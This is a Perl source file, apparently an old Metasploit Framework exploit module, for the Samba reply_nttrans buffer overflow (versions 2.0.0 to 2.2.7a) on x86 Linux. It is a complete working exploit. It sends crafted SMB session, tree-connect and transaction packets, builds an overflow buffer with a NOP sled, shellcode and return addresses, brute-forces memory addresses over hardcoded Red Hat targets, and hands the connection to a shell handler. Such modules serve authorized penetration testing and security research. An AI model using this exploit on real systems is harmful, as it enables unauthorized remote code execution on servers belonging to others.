##
# This file is part of the Metasploit Framework and may be redistributed according
# to the licenses defined in the Authors fields below. In the case of a an Unknown
# license, this file defaults to using the same license as the core Framework. The
# latest version of the Framework can always be obtained from http://metasploit.com
##

package Msf::Exploit::samba_nttrans;
use base "Msf::Exploit";
use strict;

my $advanced = { };

my $info =
{
    'Name'  => 'Samba reply_nttrans Overflow',
    'Version'  => '$Revision$',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'linux' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The samba port', 139],
                    'BASEA',=> [0, 'DATA', 'Use specified based address'],
                    'DEBUG' => [0, 'BOOL', 'Enable debugging mode'],
                   },
                
    'Payload' => {
                    'Space'      => 1024,
                    'BadChars'  => "\x00",
                 },
    
    'Description'  => qq{
        This exploits the buffer overflow found in Samba versions
        2.0.0 to 2.2.7a. This particular module is capable of
        exploiting the bug on x86 Linux only. Flatline's sambash
        code was used as a reference for this module.
    },
    'Refs'  =>  [  
                    'http://www.osvdb.org/6323',
                ],
    'Targets' => [
                    
                    ["Samba 2.0 Brute Force", 0x08150000, 0x08140000, 1600, 0xbfffb8d0, 6200],
                    ["Samba 2.2 Brute Force", 0x08200000, 0x081d0000, 1600, 0xbfffb8d0, 6200],                    
                    ["Samba 2.0.7 / Red Hat 7.0",  0x0814bb40, 0x0814bb40, 1600, 0xbfffb8d0, 6200],
                    ["Samba 2.2.1 / Red Hat 7.2",  0x081f95c0, 0x081f95c0, 1600, 0xbfffb8d0, 6200],
                    ["Samba 2.2.5 / Red Hat 8.0",  0x08239e00, 0x08239e00, 1600, 0xbfffb8d0, 6200],
                ],
    
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

    my $target = $self->Targets->[$target_idx];

    $self->PrintLine("[*] Starting brute force mode for target ".$target->[0]);
    
    if ($self->GetVar('BASEA'))
    {
        my $ret = eval($self->GetVar('BASEA')) + 0;
        $target->[1] = $target->[2] = $ret;
    }
    
    my $param_base;
    for ( 
          $param_base  = $target->[1]; 
          $param_base >= $target->[2];
          $param_base -= $target->[3]
        )
    {
       
        
        my $s = Msf::Socket->new();

        if (! $s->Tcp($target_host, $target_port, $self->GetVar('CPORT')))
        {
            $self->PrintLine("");
            $self->PrintLine("[*] Error: ". $s->GetError());
            return;
        }

        my $ReqSize = 12000;
        
        my $SetupSession = 
        "\x00\x00\x00\x2e\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x08\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x20\x02\x00\x01\x00\x00".
        "\x00\x00";

        my $TreeConnect =
        "\x00\x00\x00\x3c\xff\x53\x4d\x42\x70\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00\x00\x00".
        "\x64\x00\x00\x00\x00\x00\x00\x00\x5c\x5c\x69\x70\x63\x24\x25\x6e".
        "\x6f\x62\x6f\x64\x79\x00\x00\x00\x00\x00\x00\x00\x49\x50\x43\x24";
       
        my $TransRequest =
        "\x00\x00\x00\x49\xff\x53\x4d\x42\xa0\x00\x00\x00\x00\x08\x01\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\xb5\x25".
        "\x64\x00\x01\x00\x13\x00\x00\x00".pack('V', $ReqSize)."\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00";

      
        $s->Send($SetupSession);
        my $res = $s->Recv(-1, 5);

        $s->Send($TreeConnect);
        $res = $s->Recv(-1, 5);
        
        $s->Send($TransRequest);
        $res = $s->Recv(-1, 5);       

        my $BaseAddr  = $param_base;
        my $StackAddr = $target->[4];
        my $TargAddr  = $StackAddr - $BaseAddr;
        my $RetAddr   = $StackAddr + $target->[5];

        my $pattern = Pex::PatternCreate($ReqSize);
        
        substr($pattern, 0, 1024, ("\x90" x 1024)); 
        substr($pattern, 1024, length($shellcode), $shellcode);
        substr($pattern, 2048, $ReqSize-2048, pack('V', $RetAddr) x (($ReqSize - 2048) * 4));

        
        my $Overflow =
        "\x00\x00\x30\x43\xff\x53\x4d\x42\xa1\x00\x00\x00\x00\x08\x01\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\xb5\x25".
        "\x64\x00\x01\x00\x00\x00\x00\x00".
        pack('V', $ReqSize).
        "\x00\x00\x00\x00".
        pack('V', $ReqSize).
        "\x44\x00\x00\x00".
        pack('V', $TargAddr).
        "\x00\x00\x00\x00".
        "\x00\x00\x00\x00".
        "\x00\x00\x00\x00". 
        $pattern;

        
        $self->PrintLine(sprintf("[*] Return address 0x%.8x using base address 0x%.8x...", $RetAddr, $BaseAddr));
        
        if ($self->GetVar('DEBUG'))
        {
            print STDERR "[*] Press enter to send overflow string...\n";
            <STDIN>;
        }
        
        $s->Send($Overflow);

        # handle client side of shellcode
        $self->Handler($s->GetSocket);
        
        return if $self->GetVar('DEBUG');
        
        $s->Close();
        undef($s);
    }
    return;
}



